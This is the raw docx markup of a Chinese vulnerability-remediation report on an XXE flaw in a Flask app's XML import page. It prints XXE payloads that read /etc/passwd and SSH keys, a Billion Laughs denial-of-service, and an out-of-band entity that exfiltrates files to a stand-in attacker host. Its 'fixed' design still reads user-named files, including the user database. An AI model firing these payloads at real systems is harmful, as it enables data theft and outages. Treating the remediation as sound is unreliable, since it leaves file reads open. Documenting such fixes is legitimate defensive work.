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宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>XXE漏洞修复安全分析报告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报告日期：2026年7月17日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项目名称：Flask 用户信息管理平台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项目地址：https://github.com/Y-a777/-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一、概述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XML 外部实体注入（XML External Entity Injection, XXE）是一种严重的安全漏洞。攻击者通过在 XML 中构造恶意外部实体引用，实现任意文件读取、SSRF 内网探测、拒绝服务等攻击。本报告详细分析项目 XML 导入功能中存在的 XXE 漏洞、攻击场景及修复方案。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>二、漏洞分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 漏洞描述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XML 导入功能接收用户提交的 XML 数据，主动提取 &lt;!ENTITY ... SYSTEM "...""&gt; 中的文件路径并读取文件内容。修复前代码未对文件路径做任何限制，且使用 Python ElementTree 解析 XML 时存在解析器层面的 XXE 风险。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漏洞代码（修复前摘要）：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提取 SYSTEM 文件路径</w:t>
        <w:br/>
        <w:t>entity_pattern = re.compile(r'&lt;!ENTITY\s+\S+\s+SYSTEM\s+"([^"]+)"')</w:t>
        <w:br/>
        <w:t>system_files = entity_pattern.findall(xml_data)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 直接打开任意文件（无限制）</w:t>
        <w:br/>
        <w:t>with open(filepath, "r", encoding="utf-8") as f:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_contents[filepath] = f.read()</w:t>
        <w:br/>
        <w:br/>
        <w:t># 解析器可能触发外部实体</w:t>
        <w:br/>
        <w:t>root = ET.fromstring(xml_data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 漏洞分类与危害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漏洞名称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风险等级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攻击目标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XXE-01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任意文件读取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严重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读取服务器任意文件（/etc/passwd、/etc/shadow 等）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XXE-02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路径遍历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 ../ 跳转目录，读取项目源码、数据库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XXE-03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解析器自身 XXE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ElementTree 默认解析外部实体，可触发 SSRF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XXE-04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Billion Laughs DoS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中危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实体递归展开导致内存耗尽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XXE-05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OOB 数据泄露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高危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通过 HTTP 外传数据到攻击者服务器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3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 攻击场景示例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场景一：任意文件读取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&lt;!-- /etc/passwd 读取 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;root&gt;&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;&lt;/root&gt;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场景二：路径遍历读取项目文件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&lt;!-- 读取项目数据库 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;!ENTITY xxe SYSTEM "../data/users.db"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>&lt;!-- 读取源码 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;!ENTITY xxe SYSTEM "../../app.py"&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>&lt;!-- 读取 SSH 密钥 --&gt;</w:t>
        <w:br/>
        <w:t>&lt;!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"&gt;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场景三：Billion Laughs 拒绝服务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&lt;!DOCTYPE lolz [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol "lol"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;..."&gt;&amp;lol9;</w:t>
        <w:br/>
        <w:t>]&gt;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上述 XML 在解析时会将 lol3 展开为 1000 个 "lol"，逐级指数增长，最终耗尽内存。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>场景四：OOB 带外数据泄露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&lt;!DOCTYPE foo [</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;!ENTITY % callhome SYSTEM "http://攻击者.com/?data=%xxe;"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  %callhome;</w:t>
        <w:br/>
        <w:t>]&gt;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文件内容通过 HTTP 请求发送到攻击者服务器。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>三、修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 文件路径白名单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仅允许读取项目目录下的指定子目录，拒绝系统路径和任意遍历：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ALLOWED_XML_READ_DIRS = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    os.path.realpath(BASE_DIR),          # 项目根</w:t>
        <w:br/>
        <w:t xml:space="preserve">    os.path.realpath(os.path.join(BASE_DIR, "pages")),  # pages/</w:t>
        <w:br/>
        <w:t xml:space="preserve">    os.path.realpath(os.path.join(BASE_DIR, "data")),   # data/</w:t>
        <w:br/>
        <w:t>]</w:t>
        <w:br/>
        <w:br/>
        <w:t>def is_allowed_xml_path(filepath):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    real_path = os.path.realpath(filepath)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for allowed_dir in ALLOWED_XML_READ_DIRS:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if real_path.startswith(allowed_dir + os.sep):</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return False</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 限制文件读取大小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限制单次读取最大 4KB，防止读取超大文件导致内存溢出：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MAX_XML_FILE_READ = 4096</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>content = f.read(MAX_XML_FILE_READ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 剥离 DOCTYPE 声明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在解析前手动剥离 DOCTYPE 声明，防止解析器接触外部实体定义：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xml_data = re.sub(r'&lt;!DOCTYPE\s+\S+\s*\[.*?\]\s*&gt;', '', xml_data, flags=re.DOTALL)</w:t>
        <w:br/>
        <w:t>xml_data = re.sub(r'&lt;!DOCTYPE\s+\S+\s*&gt;', '', xml_data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 限制 XML 总大小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限制 XML 数据最大 500KB，防止 Billion Laughs 等内存耗尽攻击：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if len(xml_data) &gt; 500000:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    error = "XML 数据过大（超过 500KB）"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 手动替换实体引用</w:t>
      </w:r>
    </w:p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  <w:t>先通过正则提取 SYSTEM 路径，读取内容后用字符串替换实体引用，再剥离 DOCTYPE 后给解析器：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 先替换实体</w:t>
        <w:br/>
        <w:t>xml_data = xml_data.replace(f"&amp;{entity_name};", content)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 再剥离 DOCTYPE</w:t>
        <w:br/>
        <w:t>xml_data = re.sub(r'&lt;!DOCTYPE...', '', xml_data)</w:t>
        <w:br/>
        <w:br/>
        <w:t># 最后安全解析（已无外部实体）</w:t>
        <w:br/>
        <w:t>root = ET.fromstring(xml_data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>四、修复前后对比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测试用例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color w:val="000000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>修复后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 XML 解析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正常解析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正常解析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XXE /etc/passwd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读取系统密码文件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拦截：禁止读取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XXE data/users.db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读取数据库（相对路径）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允许：在白名单内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XXE ../../app.py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读取项目源码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拦截：超出白名单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Billion Laughs 攻击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C80000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>内存耗尽崩溃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解析错误/剥离 DOCTYPE ✅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SSRF 云元数据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0000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>可能触发网络请求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 w:val="0"/>
                <w:color w:val="008000"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>拦截：不在白名单内 ✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>五、涉及文件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app.py — 新增 is_allowed_xml_path() 白名单校验、MAX_XML_FILE_READ 大小限制、DOCTYPE 剥离、XML 总大小限制、手动替换实体引用替代解析器自动解析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templates/xml_import.html — 新增 XML 导入页面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templates/base.html — 导航栏新增"XML导入"链接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static/css/style.css — 新增 XML 导入区域样式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>六、安全建议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绝对不要使用 XML 解析器直接解析包含用户输入的 DTD/外部实体的 XML。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在解析 XML 前剥离所有 DOCTYPE 声明，阻止解析器接触外部实体。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对文件读取路径做白名单校验，使用 realpath 规范化路径防止遍历。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限制 XML 数据总大小和单次文件读取大小，防止拒绝服务攻击。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优先考虑使用 JSON 或 YAML 等不易受 XXE 攻击的数据格式替代 XML。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>如果必须使用 XML，使用 defusedxml 库（Python 官方推荐的 XXE 防护库）。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